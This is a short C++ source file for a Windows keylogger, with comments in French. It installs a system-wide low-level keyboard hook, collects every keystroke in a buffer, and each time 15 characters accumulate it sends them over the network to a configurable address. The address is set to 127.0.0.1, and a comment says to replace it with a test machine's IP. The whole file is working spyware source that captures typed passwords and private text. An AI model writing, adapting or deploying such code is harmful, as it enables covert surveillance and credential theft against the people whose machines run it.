#include <windows.h> 
#include <wininet.h>
#include "../include/keylogger.h"
#include "../include/network.h"
#include <string>

using namespace std;

string buffer = "";
HHOOK hHook = NULL;

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        
        char key = (char)pKey->vkCode;
        buffer += key;

        if (buffer.length() >= 15) {
            SendData("127.0.0.1", 5000, buffer); // A remplacer par l'adresse IP de la machine de test
            buffer = "";
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void StartLogging() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}